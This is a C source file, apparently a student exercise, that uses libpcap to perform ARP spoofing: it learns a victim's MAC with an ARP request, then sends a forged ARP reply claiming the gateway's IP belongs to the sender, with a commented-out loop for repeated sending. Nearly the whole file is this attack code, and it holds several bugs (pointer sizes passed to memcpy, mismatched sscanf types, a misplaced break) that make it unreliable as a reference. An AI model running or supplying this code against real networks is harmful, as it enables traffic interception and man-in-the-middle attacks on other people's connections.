#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/in.h>
//#include <net/if_arp.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#define ETHERTYPE_ARP 0x0806
enum { ARGV_CMD, ARGV_INTERFACE };
 
int s_getMacAddress(const char * dev, unsigned char * mac)
{
    int sock;
    struct ifreq ifr;
 
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
 
    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
 
    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
        perror("socket ");
        return 1;
    }
 
    if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
        perror("ioctl ");
        return 1;
    }
 
    memcpy (mac, (void*)&ifr.ifr_hwaddr.sa_data, sizeof(ifr.ifr_hwaddr.sa_data));  
 
 
    //close(sock);
    return 0;
}
int s_getIpAddress(const char * ifr, unsigned char * out) {
	int sockfd;
	struct ifreq ifrq;
	struct sockaddr_in * sin;
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	strcpy(ifrq.ifr_name, ifr);
	if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
		perror("ioctl() SIOCGIFADDR error");
		return -1;
	}
	sin = (struct sockaddr_in *)&ifrq.ifr_addr;
	memcpy(out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));


	close(sockfd);

	return 4;
}
typedef struct _arp_hdr arp_hdr;
#pragma pack(push, 1)
struct _arp_hdr{
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};
#pragma pack(pop)


int main(int argc, char *argv[]){

	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "port 80";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr *header;	/* The header that pcap gives us */
	struct in_addr my_ip_addr;
	//const u_char *packet;		/* The actual arp_packet */
	//u_char arp_packet[43];
	u_char packet[1000];
	u_char attacker_packet[1500];
	const u_char *p;
	arp_hdr arphdr, attacker_arphdr;
	uint8_t src_ip[4], src_mac[6], dst_mac[6];
	uint8_t dst_ip[4], gate_ip[4];

	int Res;
	
	if(argc != 4){
		perror("Check argument! (./test_v4 <interface> <sender ip> <target_ip>\n");
		return 2;
	}
	
// ARGV[1]
	if (pcap_lookupnet(argv[1], &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	int cnt = 0;
	char dot = '.';
	
	//res = pcap_next_ex(handle, &header,&packet);
	//get_mac_by_inf(my_mac, argv[1]);
	//get_ip_by_inf(&my_ip_addr, argv[1]);
	s_getMacAddress(argv[1], src_mac);
	s_getIpAddress(argv[1], src_ip);
	sscanf(argv[2], "%d.%d.%d.%d", &dst_ip[0], &dst_ip[1], &dst_ip[2], &dst_ip[3]);
	sscanf(argv[3], "%d.%d.%d.%d", &gate_ip[0], &gate_ip[1], &gate_ip[2], &gate_ip[3]);
	for(int j=0; j<4;j++)
	{
		printf("%d", dst_ip[j]);
	}
	printf("\n");
	for(int k=0; k<4; k++)
	{
		printf("%d", gate_ip[k]);
	}
	printf("\n");
	/*broadcast */
	//ce.sharif.edu/courses/86-87/2/ce416/resources/root/Arp-Example.c
   /*u_char arp_packet[43]={               
		/* 						    				       			 */
		//0x54,0x88,0x0E,0x7F,0xC4,0x02,   /*destination mac   */ 
		//0xe4,0x42,0xa6,0xa1,0xab,0x12,   /*source Mac      */
		//0x08, 0x06,				         /*ether Type                			 */
		/*	ARP PACKET  */
		//0x00, 0x01,						 /*hardware Type 						 */
		//0x08, 0x00,						 /*protocol Type 						 */
		//0x06,					         /*hardware size, length      			 */ 
		//0x04,					         /*protocol size			  			 */
		//0x00, 0x02,				         /*Opcode 2 rply        			 */
		//0xe4,0x42,0xa6,0xa1,0xab,0x12,   /*attacker MAC*/
		//0xc0,0xa8,0x00,0x01,		     /*sender IP (GW IP)		 			 */
		//0x54,0x88,0x0E,0x7F,0xC4,0x02,   /*target MAC Win7    */
		//0xc0,0xa8,0x00,0x30				 /*target IP      : Target              */
//};
	memset(packet, 0, sizeof(packet));
	struct ether_header* ether_hdr = (struct ether_header *)packet;

	ether_hdr->ether_type = htons(ETHERTYPE_ARP); //to make arp packet
	int i;
	for(i=0; i<6; i++){ //to broadcast and get sender's arp address
		ether_hdr->ether_dhost[i]=0xff;
		ether_hdr->ether_shost[i] = src_mac[i];
		arphdr.sender_mac[i] = src_mac[i];
		arphdr.target_mac[i] = 0x00;

	}
	arphdr.htype = htons(1);
	arphdr.ptype = htons(ETH_P_IP);
	arphdr.hlen = 6;
	arphdr.plen = 4;
	arphdr.opcode = htons(1); //ARP Request
		
	for(i =0; i<4; i++){
		arphdr.sender_ip[i] = src_ip[i];
		printf("%d", arphdr.sender_ip[i]);
		printf("\n");
		arphdr.target_ip[i] = dst_ip[i];
		printf("%d", arphdr.target_ip[i]);
		printf("\n");
	}

	memcpy(packet, ether_hdr, sizeof(ether_hdr));
	memcpy(packet + 14, &arphdr, sizeof(arphdr));

	if(pcap_sendpacket(handle, packet, 42) != 0)
	{
		printf("error");
	}

	while((Res = pcap_next_ex(handle, &header, &p)) >=0)
	{
		
		if(Res == 0)
		{
			continue;
		}
		struct ether_header* eh = (struct ether_header *)p;
		for(int l=0; l<42; l++)
		{
			printf("%0.2x ", *(p+l) );
		}
		//printf("%0.2X",->ether_type);
		//if(eh->ether_type == htons(0x0806) && eh->ether_dhost[0] == ether_hdr->ether_shost[0] && eh->ether_dhost[1] == eh->ether_shost[1] && eh->ether_dhost[2] == eh->ether_shost[2] && eh->ether_dhost[3] == eh->ether_dhost[3]&& eh->ether_dhost[4] == eh->ether_dhost[4]&& eh->ether_dhost[5] == eh->ether_dhost[5])
		if(p[12] == 0x08 && p[13] == 0x06)
		{
			for (i = 0; i < 6; i++)
				dst_mac[i] = eh->ether_shost[i];
				break;
		}
		else
		{
			printf("Failed. Try again\n");
			//return -1;
			//break;
			//continue;
		}

	}
	for(int l=0; l<6; l++)
	{
		printf("%0.2x", dst_mac[l]);
	}
	
	pcap_close(handle);

	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		return(2);
	}
	memset(packet, 0, sizeof(packet));
	printf("%d\n", attacker_arphdr.target_ip[i]);
	struct ether_header* attacker_ether = (struct ether_header *)attacker_packet;
	attacker_ether->ether_type = htons(0x0806);

	for(i=0; i<6; i++){
		attacker_ether->ether_dhost[i] = dst_mac[i];
		attacker_arphdr.target_mac[i] = dst_mac[i];
	}
	for(i=0; i<6; i++){
		attacker_ether->ether_shost[i] = src_mac[i];
		attacker_arphdr.sender_mac[i] = src_mac[i];
	}
	attacker_arphdr.htype = htons(1);
	attacker_arphdr.ptype = htons(ETH_P_IP);
	attacker_arphdr.hlen = 6;
	attacker_arphdr.plen = 4;
	attacker_arphdr.opcode = htons(2); //reply

	for(i=0; i<4; i++){
			attacker_arphdr.sender_ip[i] = gate_ip[i];
			attacker_arphdr.target_ip[i] = dst_ip[i];
			printf("%d\n", attacker_arphdr.target_ip[i]);
	}
	memcpy(attacker_packet, attacker_ether, sizeof(attacker_ether));
	memcpy(attacker_packet + 14, &attacker_arphdr, sizeof(attacker_arphdr));
	for(int l2=0; l2<42; l2++)
	{
		printf("%0.2X ", *(attacker_packet+l2));
	}
	if(pcap_sendpacket(handle, attacker_packet, 42) != 0)
	{
		printf("error");
	}
	else
		printf("clear\n");

	pcap_close(handle);
	return 0;
	/*int count=0;
	 while(1){
		pcap_sendpacket(handle,arp_packet,43);
		printf("%d",count++);
		printf("\r"); 	
	 }  
	
	pcap_close(handle);*/
	return(0);
}
